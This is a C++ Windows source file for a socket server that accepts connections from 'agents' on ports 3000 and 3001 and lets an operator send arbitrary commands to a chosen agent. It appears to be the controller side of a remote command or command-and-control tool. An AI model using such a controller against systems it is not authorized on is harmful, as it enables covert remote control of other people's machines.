#include "Server.hpp"


std::string GetSocketStr(SocketClientInfo& socketClientInfo) {
    std::ostringstream oss;
    oss << socketClientInfo.szIp << ":" << socketClientInfo.nPort;
    return oss.str();
}

VOID PrintActiveSockets(std::vector<AgentConnection*>& arrAgentConnections) {
    SocketClientInfo socketClientInfo;

    if (arrAgentConnections.size() == 0) {
        std::cout << "[+] No active sockets\n";
    }
    else {
        std::cout << "[+] Active sockets:\n";

        for (AgentConnection* conn : arrAgentConnections) {
            conn->GetSocketClientInfo(socketClientInfo);
            std::cout << "[+] Connected to " << GetSocketStr(socketClientInfo) << "\n";
        }
    }
}

BOOL ListenForTcpPort(INT nPort, SOCKET listeningSocket, std::vector<AgentConnection*>& arrAgentConnections)
{
    SocketClientInfo socketClientInfo;

    fd_set master_set, read_set;
    FD_ZERO(&master_set);
    FD_SET(listeningSocket, &master_set);

    while (true) {
        read_set = master_set;

        int activity = select(0, &read_set, nullptr, nullptr, nullptr);
        if (activity == SOCKET_ERROR) {
            std::cerr << "select() failed\n";
            break;
        }

        // Check for new connections
        if (FD_ISSET(listeningSocket, &read_set)) {
            sockaddr_in clientAddr;
            int addrlen = sizeof(clientAddr);

            SOCKET clientSocket = accept(listeningSocket, (sockaddr*)&clientAddr, &addrlen);

            if (clientSocket != INVALID_SOCKET) {
                FD_SET(clientSocket, &master_set);
                AgentConnection* agentCon = new AgentConnection(clientSocket);
                arrAgentConnections.push_back(agentCon);
                agentCon->GetSocketClientInfo(socketClientInfo);
                std::cout << "[+] Connected to " << GetSocketStr(socketClientInfo) << "\n";
                PrintActiveSockets(arrAgentConnections);
             
            }
        }

        // Check for data or closed connections
        for (auto connectionsIterator = arrAgentConnections.begin(); connectionsIterator != arrAgentConnections.end();) {
            INT nBytesReceived;
            AgentConnection* conn = *connectionsIterator;


            if (FD_ISSET(conn->GetSocket(), &read_set)) {
                char buffer[4096];
                nBytesReceived = recv(conn->GetSocket(), buffer, sizeof(buffer) - 1, 0);
                conn->GetSocketClientInfo(socketClientInfo);

                if (nBytesReceived <= 0) {
                    std::cout << "[-] Disconnected from " << GetSocketStr(socketClientInfo) << "\n";
                    FD_CLR(conn->GetSocket(), &master_set);

                    delete conn;
                    connectionsIterator = arrAgentConnections.erase(connectionsIterator);

                    PrintActiveSockets(arrAgentConnections);
                    continue;
                }
                else {
                    buffer[nBytesReceived] = '\0';
                    std::cout << "[Agent " << GetSocketStr(socketClientInfo) << "] response: " << buffer << std::endl;
                }
            }

            ++connectionsIterator;
        }
    }


    //SOCKET clientSocket = accept(lpThreadArgs->sock, reinterpret_cast<sockaddr*>(&addr), &addrLen);

    //if (clientSocket == INVALID_SOCKET)
    //{
    //    std::cerr << "accept() failed. Error: " << WSAGetLastError() << '\n';
    //    //closesocket(lpThreadArgs->sock);
    //    return FALSE;
    //}

    //GetSocketClientInfo(addr, socketClientInfo);
    //std::cout << "[+] Connected to " << socketClientInfo.szIp << ":" << socketClientInfo.nPort << "\n";

    //// To Agent
    //if (!lpThreadArgs->bIsToController) {
    //    AgentConnection* agentCon = new AgentConnection(clientSocket);
    //    agentCon->SendCommand("echo hello");
    //    std::string resp = agentCon->ReceiveData();
    //    std::cout << "[+] Got response: " << resp << "\n";
    //    delete agentCon;
    //}
  
    return TRUE;
}

BOOL CreateSocket(INT port, SOCKET& outSocket) {
    outSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (outSocket == INVALID_SOCKET)
        return FALSE;

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(outSocket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR ||
        listen(outSocket, SOMAXCONN) == SOCKET_ERROR)
    {
        closesocket(outSocket);
        outSocket = INVALID_SOCKET;
        return FALSE;
    }

    return TRUE;
}


int main1() {
    WSADATA wsaData;
    SOCKET arrListeningSockets[2];
    std::thread arrThreads[2];
    std::vector<AgentConnection*> arrAgentConnections;
    
    //ThreadArgs* argsArray = new ThreadArgs[2];

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    CreateSocket(3000,arrListeningSockets[0]);
    CreateSocket(3001, arrListeningSockets[1]);

    // Start listener threads
    arrThreads[1] = std::thread(ListenForTcpPort, 3001, std::ref(arrListeningSockets[1]), std::ref(arrAgentConnections));
    //threads[0] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ListenForTcpPort , (LPVOID)&argsArray[0], 0, NULL);
    //threads[1] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ListenForTcpPort, (LPVOID)&argsArray[1], 0, NULL);

    std::cout << "[+] Listening for clients on port 3000\n";
    std::cout << "[+] Listening for agents on port 3001\n";
    std::cout << "[*] Press any key to send commands\n";
    while (TRUE) {
        if (_kbhit()) {
            std::string szIpPortToCommand;
            std::string szCommand;

            std::cout << "Enter IP:PORT to command: ";
            std::getline(std::cin, szIpPortToCommand);
            SocketClientInfo socketClientInfo;
            for (AgentConnection* conn : arrAgentConnections) {
                conn->GetSocketClientInfo(socketClientInfo);
                if (GetSocketStr(socketClientInfo) == szIpPortToCommand) {
                    std::cout << "[*] Socket exists!\n";
                    std::cout << "[*] Enter command to run on "<< szIpPortToCommand << "\n";                                    
                    std::getline(std::cin, szCommand);
                    
                    if (!szCommand.empty()) {
                        conn->SendCommand(szCommand);
                    }
                    else {
                        std::cout << "[!] Command cannot be empty.\n";
                    }
                }
                else {
                    std::cout << "[!] Socket does not exist!\n";
                }
            }
        }

    }
    /*AgentConnection* a = new AgentConnection(arrListeningSockets[1]);
    SocketClientInfo info;
    a->GetSocketClientInfo(info);
    std::cout << "[+] Listening for agents on port " << info.nPort << "\n";*/

    // Wait for threads (infinite)
    arrThreads[1].join();
    //WaitForMultipleObjects(1, &threads[1], TRUE, INFINITE);


    closesocket(arrListeningSockets[0]);
    for (AgentConnection* conn : arrAgentConnections) {
        delete conn;
    }
    //closesocket(arrListeningSockets[1]);
    WSACleanup();

    return 0;
}
